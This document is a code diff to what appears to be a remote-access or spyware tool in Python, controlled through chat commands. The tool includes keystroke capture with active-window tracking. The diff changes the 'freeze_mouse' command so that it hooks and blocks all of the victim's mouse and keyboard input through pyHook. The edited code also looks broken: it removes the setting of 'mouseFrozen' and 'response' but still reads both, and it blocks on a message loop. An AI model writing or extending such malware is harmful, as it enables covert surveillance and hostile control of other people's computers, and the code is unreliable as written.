@@ -125,7 +125,13 @@ def get_curr_window():
 		kernel32.CloseHandle(hwnd)
 		kernel32.CloseHandle(h_process)
 		return pid_info
-	
+
+def false_event(event):
+        return False
+        
+def true_event(event):
+        return True
+
 def pressed_chars(event):
 	data = None
 	global curr_window
@@ -294,10 +300,13 @@ def handle(msg):
                                         response += 'enabled'
                         elif command.endswith('freeze_mouse'):
                                 global mouseFrozen
-                                mouseFrozen = not command.startswith('/un')
-                                hookManager.MouseAll = lambda event: not mouseFrozen
-                                hookManager.HookMouse()
-                                response = 'Mouse is now '
+                                import pythoncom, pyHook 
+                                mse = pyHook.HookManager()
+                                mse.MouseAll = false_event
+                                mse.KeyAll = false_event
+                                mse.HookMouse()
+                                mse.HookKeyboard()
+                                pythoncom.PumpMessages()
                                 if mouseFrozen:
                                         response += 'disabled. To enable, use /unfreeze_mouse'
                                 else:
